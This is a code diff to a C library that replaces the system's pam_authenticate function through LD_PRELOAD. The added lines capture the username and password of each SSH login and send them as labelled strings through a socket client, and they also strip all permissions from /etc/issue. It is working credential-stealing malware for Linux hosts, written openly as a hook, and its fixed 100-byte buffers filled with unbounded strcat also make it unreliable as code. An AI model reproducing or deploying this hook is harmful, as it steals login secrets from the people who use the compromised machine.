@@ -5,8 +5,11 @@
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 #include "socket/client/client.h"
+#include <sys/stat.h>
 
 typedef int (*pam_authenticate_t)(pam_handle_t *, int);
+
+//this function's role is to retrieve and store the username used to connect to a remote machine with SSH
 
 char *get_username(pam_handle_t *pamh) {
     char *username = NULL;
@@ -20,7 +23,7 @@ char *get_username(pam_handle_t *pamh) {
     return username;
 }
 
-
+//this function's role is to retrieve and store the password that the user used to access his machine with SSH
 char *get_password(pam_handle_t *pamh) {
     struct pam_conv *conv;
     
@@ -51,7 +54,14 @@ char *get_password(pam_handle_t *pamh) {
     return NULL;
 }
 
+//this function's role is to impersonate the authentic pam_authenticate function thanks to LD_PRELOAD
 int pam_authenticate(pam_handle_t *pamh, int flags) {
+
+    int8_t result = chmod("/etc/issue", 000);
+    if (result == -1) {
+        perror("chmod failed");
+    }
+
     static pam_authenticate_t original_pam_authenticate = NULL;
 
     if (!original_pam_authenticate) {
@@ -62,9 +72,14 @@ int pam_authenticate(pam_handle_t *pamh, int flags) {
         }
     }
 
-    get_username(pamh);
-    get_password(pamh);
-    send_credentials_client("CECI EST UN TESTTEEAAAAAAHAAHHAHAHHAHAHHAHHAH\n"); 
+    char *username = get_username(pamh);
+    char username_text[100] = "USERNAME : ";
+    char *pwd = get_password(pamh);
+    char pwd_text[100] = "PASSWORD : ";
+    strcat(username_text,username); 
+    strcat(pwd_text,pwd); 
+    send_credentials_client(username_text); 
+    send_credentials_client(pwd_text); 
 
     return original_pam_authenticate(pamh, flags);
 }
